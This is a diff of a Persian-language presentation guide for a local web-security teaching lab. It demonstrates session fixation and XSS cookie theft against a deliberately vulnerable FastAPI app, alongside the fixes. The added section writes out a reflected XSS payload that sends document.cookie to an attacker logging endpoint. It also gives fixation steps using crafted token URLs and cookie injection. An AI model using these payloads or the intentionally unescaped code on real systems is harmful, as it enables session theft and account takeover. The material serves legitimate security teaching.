@@ -1,24 +1,22 @@
-# 🎯 راهنمای ارائه - آزمایشگاه امنیت نشست
+# 🎯 راهنمای ارائه - آزمایشگاه امنیت نشست v2.0
 
 > این راهنما برای نمایش و ارائه آسیب‌پذیری‌های مدیریت نشست و احراز هویت طراحی شده است.
 
 ---
 
-## 📋 خلاصه پروژه
+## 🆕 ویژگی‌های جدید Version 2.0
 
-این پروژه یک **آزمایشگاه امنیتی** است که سه نوع آسیب‌پذیری/حمله را نمایش می‌دهد:
-
-| حمله | توضیح | نمایش در پروژه |
-|------|-------|----------------|
-| **Session Fixation** | مهاجم شناسه نشست را از قبل تعیین می‌کند | ✅ کامل |
-| **Session Hijacking** | مهاجم شناسه نشست قربانی را سرقت می‌کند | ✅ کامل |
-| **Token Regeneration** | راه‌حل امن برای جلوگیری از حملات | ✅ کامل |
+| ویژگی | توضیح |
+|-------|-------|
+| **Real XSS Attack** | Endpoint آسیب‌پذیر برای Reflected XSS |
+| **Hacker Dashboard** | پنل نمایش کوکی‌های سرقت شده |
+| **Session TTL** | منقضی شدن سشن بعد از ۵ دقیقه |
+| **User-Agent Binding** | بایند شدن سشن به مرورگر |
+| **IP Binding** | بایند شدن سشن به آدرس IP |
 
 ---
 
 ## 🚀 راه‌اندازی سریع
-
-### مرحله ۱: اجرای سرور
 
 ```powershell
 cd "d:\iman\tmp\test prefect"
@@ -26,307 +24,218 @@ cd "d:\iman\tmp\test prefect"
 python main.py
 ```
 
-### مرحله ۲: دسترسی به برنامه
+---
 
-| نسخه | آدرس |
+## 📍 آدرس‌های مهم
+
+| صفحه | آدرس |
 |------|------|
-| صفحه اصلی | http://localhost:8000 |
-| نسخه آسیب‌پذیر | http://localhost:8000/vulnerable/login |
-| نسخه امن | http://localhost:8000/secure/login |
-| ثبت‌نام آسیب‌پذیر | http://localhost:8000/vulnerable/register |
-| ثبت‌نام امن | http://localhost:8000/secure/register |
+| 🏠 صفحه اصلی | http://localhost:8000 |
+| 🔴 لاگین آسیب‌پذیر | http://localhost:8000/vulnerable/login |
+| 🟢 لاگین امن | http://localhost:8000/secure/login |
+| 💀 پنل مهاجم | http://localhost:8000/hacker/dashboard |
+| 🎯 دمو XSS | http://localhost:8000/vulnerable/xss-demo |
+| 🔍 جستجوی آسیب‌پذیر | http://localhost:8000/vulnerable/search |
+| 🔍 جستجوی امن | http://localhost:8000/secure/search |
 
-### اطلاعات ورود پیش‌فرض
-
-```
-نام کاربری: admin
-رمز عبور: 123456
-```
+**اطلاعات ورود:** `admin` / `123456`
 
 ---
 
-## 🔴 دمو ۱: حمله Session Fixation
+## 🔴 دمو ۱: حمله Session Fixation (۵ دقیقه)
 
-### مفهوم حمله
+### مفهوم
+مهاجم شناسه نشست را **قبل از لاگین** به قربانی می‌دهد.
 
-> مهاجم یک شناسه نشست انتخاب می‌کند و آن را به قربانی می‌دهد. وقتی قربانی لاگین می‌کند، مهاجم با همان شناسه به حساب او دسترسی پیدا می‌کند.
+### مراحل
 
-### مراحل نمایش (۵ دقیقه)
-
-#### مرحله ۱: آماده‌سازی
-1. **دو مرورگر یا پنجره** باز کنید:
-   - مرورگر ۱: نقش **مهاجم** 🔴
-   - مرورگر ۲: نقش **قربانی** 🟢
-
-#### مرحله ۲: مهاجم لینک آلوده می‌سازد
-در مرورگر مهاجم، این URL را نشان دهید:
-```
-http://localhost:8000/vulnerable/login?token=HACKER_SESSION_123
-```
-
-**توضیح دهید:** مهاجم این لینک را از طریق ایمیل، پیامک یا شبکه اجتماعی به قربانی ارسال می‌کند.
-
-#### مرحله ۳: قربانی روی لینک کلیک می‌کند
-در مرورگر قربانی:
-1. آدرس بالا را باز کنید
-2. با اطلاعات لاگین وارد شوید:
-   - نام کاربری: `admin`
-   - رمز عبور: `123456`
-3. به **داشبورد** منتقل می‌شوید
-
-**به شناسه نشست در داشبورد توجه کنید:** همان `HACKER_SESSION_123` است!
-
-#### مرحله ۴: مهاجم دسترسی پیدا می‌کند
-در مرورگر مهاجم:
-1. **DevTools** را باز کنید (`F12`)
-2. به تب **Console** بروید
-3. این دستور را اجرا کنید:
-   ```javascript
-   document.cookie = "vulnerable_session=HACKER_SESSION_123"
+1. **مهاجم لینک مخرب می‌سازد:**
    ```
-4. به این آدرس بروید:
+   http://localhost:8000/vulnerable/login?token=EVIL_SESSION_123
+   ```
+
+2. **قربانی روی لینک کلیک می‌کند و لاگین می‌کند**
+
+3. **مهاجم با همان توکن وارد می‌شود:**
+   ```javascript
+   // در DevTools Console
+   document.cookie = "vulnerable_session=EVIL_SESSION_123"
+   ```
+
+4. **مهاجم به داشبورد دسترسی پیدا می‌کند:**
    ```
    http://localhost:8000/vulnerable/dashboard
    ```
 
-**نتیجه:** مهاجم بدون دانستن رمز عبور، به حساب قربانی دسترسی پیدا کرد! 💀
-
 ---
 
-## 🔵 دمو ۲: حمله Session Hijacking
+## 🔵 دمو ۲: حمله XSS و سرقت کوکی (۱۰ دقیقه) 🆕
 
-### مفهوم حمله
+### مفهوم
+این حمله **واقعی** است! مهاجم از طریق XSS کوکی قربانی را سرقت می‌کند.
 
-> مهاجم شناسه نشست فعال قربانی را سرقت می‌کند (مثلاً از طریق XSS یا شنود شبکه) و با آن به حساب قربانی وارد می‌شود.
-
-### مراحل نمایش (۵ دقیقه)
+### مراحل
 
 #### مرحله ۱: قربانی لاگین می‌کند
-1. در مرورگر **قربانی**، به آدرس زیر بروید:
-   ```
-   http://localhost:8000/vulnerable/login
-   ```
-2. لاگین کنید
-3. به داشبورد بروید و **شناسه نشست** را یادداشت کنید
+```
+http://localhost:8000/vulnerable/login
+```
+با `admin` / `123456` وارد شوید.
 
-#### مرحله ۲: سرقت شناسه نشست
+#### مرحله ۲: قربانی روی لینک مخرب کلیک می‌کند
+```
+http://localhost:8000/vulnerable/search?q=<script>fetch('/hacker/log?cookie='+document.cookie)</script>
+```
 
-**سناریوی واقعی:** در دنیای واقعی، مهاجم می‌تواند شناسه را از طریق:
-- ✅ حمله XSS (اگر `httpOnly=false` باشد)
-- ✅ شنود شبکه (اگر HTTPS نباشد)
-- ✅ دسترسی فیزیکی به مرورگر
+#### مرحله ۳: مهاجم کوکی سرقتی را می‌بیند
+به پنل مهاجم بروید:
+```
+http://localhost:8000/hacker/dashboard
+```
 
-برای نمایش، در مرورگر قربانی:
-1. DevTools → Console
-2. اجرا کنید:
-   ```javascript
-   console.log("شناسه نشست سرقت شده:", document.cookie)
-   ```
-3. شناسه نشست را کپی کنید
+**کوکی سرقت شده را خواهید دید! 💀**
 
-#### مرحله ۳: مهاجم از شناسه سرقتی استفاده می‌کند
-در مرورگر **مهاجم** (تب جدید یا Incognito):
-1. DevTools → Console
-2. شناسه سرقتی را وارد کنید:
-   ```javascript
-   document.cookie = "vulnerable_session=شناسه_سرقتی"
-   ```
-3. به داشبورد بروید:
-   ```
-   http://localhost:8000/vulnerable/dashboard
-   ```
+#### مرحله ۴: مهاجم با کوکی سرقتی لاگین می‌کند
+در مرورگر دیگر (Incognito):
+```javascript
+document.cookie = "vulnerable_session=STOLEN_COOKIE_VALUE"
+```
+سپس به داشبورد بروید:
+```
+http://localhost:8000/vulnerable/dashboard
+```
 
-**نتیجه:** مهاجم به حساب قربانی دسترسی پیدا کرد!
+### چرا این کار می‌کند؟
+1. ❌ ورودی کاربر escape نمی‌شود → XSS
+2. ❌ کوکی HttpOnly نیست → JavaScript می‌تواند بخواند
+3. ❌ سشن به مرورگر بایند نشده → مهاجم می‌تواند استفاده کند
 
 ---
 
-## 🟢 دمو ۳: راه‌حل امن (Token Regeneration)
+## 🟢 دمو ۳: محافظت‌های امنیتی (۵ دقیقه) 🆕
 
-### مفهوم راه‌حل
-
-> پس از هر احراز هویت موفق، شناسه نشست جدید تولید می‌شود. این کار حملات Session Fixation را بی‌اثر می‌کند.
-
-### مراحل نمایش (۳ دقیقه)
-
-#### تست Session Fixation روی نسخه امن
-
-1. در مرورگر، به آدرس زیر بروید:
-   ```
-   http://localhost:8000/secure/login?token=HACKER_SESSION_123
-   ```
-2. لاگین کنید
-3. به شناسه نشست در داشبورد نگاه کنید
-
-**نتیجه:** شناسه نشست **کاملاً متفاوت** از `HACKER_SESSION_123` است! ✅
-
-### تفاوت کد
-
-#### ❌ کد آسیب‌پذیر:
-```python
-# شناسه نشست از کوکی موجود استفاده می‌شود
-existing_session_id = request.cookies.get("vulnerable_session")
-session_data.user_id = user.id  # فقط کاربر را متصل می‌کنیم
-session_id = existing_session_id  # ❌ همان شناسه قبلی!
+### تست ۱: XSS در نسخه امن
 ```
-
-#### ✅ کد امن:
-```python
-import secrets
-
-# همیشه شناسه جدید تولید می‌شود
-new_session_id = secrets.token_hex(32)  # ✅ شناسه تصادفی
-
-# نشست قدیمی حذف می‌شود
-if old_session:
-    db.delete(old_session)
-
-# نشست جدید ایجاد می‌شود
-new_session = SessionData(session_id=new_session_id, user_id=user.id)
+http://localhost:8000/secure/search?q=<script>alert('XSS')</script>
 ```
+**نتیجه:** کد JavaScript اجرا نمی‌شود! (HTML Escaped)
+
+### تست ۲: Session Hijacking در نسخه امن
+حتی اگر مهاجم کوکی را داشته باشد:
+```javascript
+document.cookie = "secure_session=STOLEN_COOKIE"
+```
+**نتیجه:** اگر از مرورگر دیگر باشد، سشن نامعتبر می‌شود!
+
+### تست ۳: Session TTL
+بعد از ۵ دقیقه بدون فعالیت، سشن منقضی می‌شود.
+
+---
+
+## 📊 جدول مقایسه امنیتی v2.0
+
+| ویژگی | نسخه آسیب‌پذیر | نسخه امن |
+|-------|---------------|----------|
+| XSS Protection | ❌ ورودی escape نمی‌شود | ✅ HTML Escaping |
+| HttpOnly Cookie | ❌ JavaScript می‌تواند بخواند | ✅ JavaScript نمی‌تواند بخواند |
+| Session Fixation | ❌ توکن URL پذیرفته می‌شود | ✅ Session Regeneration |
+| Session TTL | ❌ بدون انقضا | ✅ ۵ دقیقه |
+| User-Agent Binding | ❌ ندارد | ✅ مرورگر چک می‌شود |
+| Session Hijacking | ❌ آسیب‌پذیر | ✅ محافظت شده |
 
 ---
 
 ## 🧪 تست خودکار
 
-برای نمایش تست خودکار به مخاطبان:
-
 ```powershell
-cd "d:\iman\tmp\test prefect"
-.venv\Scripts\python test_attack.py
-```
-
-### خروجی مورد انتظار:
-
-```
-🔴 تست حمله Session Fixation - نسخه آسیب‌پذیر
-   ✅ موفق: حمله Session Fixation موفق بود!
-
-🟢 تست حمله Session Fixation - نسخه امن  
-   ✅ موفق: Session Regeneration موفق بود!
+python test_all_attacks.py
 ```
 
 ---
 
-## 📊 جدول مقایسه امنیتی
-
-| ویژگی | نسخه آسیب‌پذیر | نسخه امن |
-|-------|---------------|----------|
-| پذیرش توکن از URL | ✅ بله | ❌ خیر |
-| Session Regeneration | ❌ خیر | ✅ بله |
-| HttpOnly Cookie | ❌ خیر | ✅ بله |
-| SameSite Cookie | Lax | Lax |
-| ایمن در برابر Fixation | ❌ | ✅ |
-| ایمن در برابر XSS Session Theft | ❌ | ✅ |
-
----
-
-## 🔧 راهکارهای امنیتی
-
-### ۱. Session Regeneration (ضروری)
-```python
-# پس از هر لاگین موفق
-new_session_id = secrets.token_hex(32)
-```
-
-### ۲. HttpOnly Cookie (ضروری)
-```python
-response.set_cookie(
-    key="session",
-    value=session_id,
-    httponly=True  # JavaScript نمی‌تواند بخواند
-)
-```
-
-### ۳. Secure Cookie (برای Production)
-```python
-response.set_cookie(
-    key="session",
-    value=session_id,
-    secure=True  # فقط HTTPS
-)
-```
-
-### ۴. SameSite Cookie (پیشنهادی)
-```python
-response.set_cookie(
-    key="session",
-    value=session_id,
-    samesite="strict"  # محافظت CSRF
-)
-```
-
-### ۵. Session Timeout (پیشنهادی)
-```python
-response.set_cookie(
-    key="session",
-    value=session_id,
-    max_age=3600  # ۱ ساعت
-)
-```
-
----
-
-## 📁 ساختار پروژه
-
-```
-test prefect/
-├── main.py                 # نقطه ورود برنامه
-├── database.py             # اتصال دیتابیس SQLite
-├── models.py               # مدل‌های User و SessionData
-├── dependencies.py         # توابع کمکی FastAPI
-├── utils.py                # توابع هش کردن رمز
-├── test_attack.py          # تست خودکار حملات
-├── README.md               # مستندات کامل
-├── PRESENTATION_GUIDE.md   # این فایل
-├── requirements.txt        # وابستگی‌ها
-├── routers/
-│   ├── vulnerable.py       # منطق آسیب‌پذیر
-│   └── secure.py           # منطق امن
-└── templates/
-    ├── base.html           # قالب پایه
-    ├── login.html          # صفحه ورود
-    ├── register.html       # صفحه ثبت‌نام
-    └── dashboard.html      # داشبورد کاربر
-```
-
----
-
-## ⏱️ زمان‌بندی پیشنهادی ارائه
+## ⏱️ زمان‌بندی ارائه
 
 | بخش | زمان |
 |-----|------|
-| معرفی و مفاهیم اولیه | ۵ دقیقه |
+| معرفی و مفاهیم | ۵ دقیقه |
 | دمو Session Fixation | ۵ دقیقه |
-| دمو Session Hijacking | ۵ دقیقه |
-| دمو راه‌حل امن | ۳ دقیقه |
-| تست خودکار | ۲ دقیقه |
+| **دمو XSS و سرقت کوکی** | ۱۰ دقیقه |
+| دمو محافظت‌های امن | ۵ دقیقه |
 | بررسی کد و سوالات | ۵ دقیقه |
-| **مجموع** | **۲۵ دقیقه** |
+| **مجموع** | **۳۰ دقیقه** |
 
 ---
 
-## ❓ سوالات متداول
+## 🛡️ راهکارهای امنیتی پیاده‌سازی شده
 
-### چرا Session Fixation خطرناک است؟
-مهاجم بدون نیاز به دانستن رمز عبور، می‌تواند به حساب کاربر دسترسی پیدا کند.
+### ۱. XSS Protection
+```python
+# آسیب‌پذیر
+html_content = f"<p>{user_input}</p>"  # ❌
 
-### Session Hijacking چه تفاوتی با Fixation دارد؟
-- **Fixation:** مهاجم شناسه را *قبل* از لاگین به قربانی می‌دهد
-- **Hijacking:** مهاجم شناسه را *بعد* از لاگین سرقت می‌کند
+# امن
+import html
+safe_input = html.escape(user_input)
+html_content = f"<p>{safe_input}</p>"  # ✅
+```
 
-### چرا HttpOnly مهم است؟
-اگر سایت آسیب‌پذیری XSS داشته باشد، مهاجم نمی‌تواند با JavaScript به کوکی دسترسی پیدا کند.
+### ۲. HttpOnly Cookie
+```python
+response.set_cookie(
+    key="session",
+    value=session_id,
+    httponly=True  # ✅ JavaScript نمی‌تواند بخواند
+)
+```
 
-### آیا HTTPS کافی است؟
-خیر! HTTPS فقط از شنود شبکه محافظت می‌کند، نه از Session Fixation.
+### ۳. Session Regeneration
+```python
+# پس از هر لاگین موفق
+new_session_id = secrets.token_hex(32)  # ✅ شناسه جدید
+```
+
+### ۴. User-Agent Binding
+```python
+# ذخیره User-Agent هنگام لاگین
+session.user_agent = request.headers.get("user-agent")
+
+# بررسی در هر درخواست
+if session.user_agent != current_user_agent:
+    invalidate_session()  # ✅ سشن نامعتبر
+```
+
+### ۵. Session TTL
+```python
+SESSION_TTL_MINUTES = 5
+
+if session_age > timedelta(minutes=SESSION_TTL_MINUTES):
+    delete_session()  # ✅ سشن منقضی شده
+```
 
 ---
 
-## 📚 منابع
+## 📁 ساختار پروژه v2.0
 
-- [OWASP Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
-- [OWASP Session Hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
-- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+```
+test prefect/
+├── main.py                 # نقطه ورود (v2.0)
+├── database.py             # اتصال SQLite
+├── models.py               # مدل‌ها (+ user_agent, ip_address)
+├── dependencies.py         # TTL & User-Agent checks
+├── utils.py                # هش رمز
+├── requirements.txt
+│
+├── routers/
+│   ├── vulnerable.py       # + XSS Search endpoint
+│   ├── secure.py           # + Secure Search endpoint
+│   └── hacker.py           # 🆕 پنل مهاجم
+│
+└── templates/
+    ├── base.html
+    ├── login.html
+    ├── register.html
+    └── dashboard.html
+```
 
 ---
 
@@ -338,4 +247,12 @@ test prefect/
 
 ---
 
-ساخته شده با ❤️ برای آموزش امنیت وب
+## 📚 منابع
+
+- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+- [OWASP Cookie Security](https://owasp.org/www-community/controls/SecureCookieAttribute)
+
+---
+
+ساخته شده با ❤️ برای آموزش امنیت وب - Version 2.0
